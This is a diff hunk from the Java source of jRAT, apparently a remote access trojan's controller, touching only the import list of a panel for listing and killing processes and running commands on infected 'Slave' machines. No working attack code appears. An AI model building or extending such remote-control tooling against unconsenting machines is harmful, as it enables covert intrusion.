@@ -5,18 +5,16 @@ import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet19ListProcesses;
 import jrat.controller.packets.outgoing.Packet20KillProcess;
 import jrat.controller.packets.outgoing.Packet38RunCommand;
+import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
 import jrat.controller.ui.renderers.table.ProcessTableRenderer;
 import jrat.controller.utils.Utils;
-import java.awt.BorderLayout;
+import oslib.OperatingSystem;
+
+import javax.swing.*;
+import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import javax.swing.JButton;
-import javax.swing.JScrollPane;
-import javax.swing.JTable;
-import javax.swing.JToolBar;
-import jrat.api.ui.DefaultJTable;
-import oslib.OperatingSystem;
 
 @SuppressWarnings("serial")
 public class PanelControlRemoteProcess extends PanelControlParent {
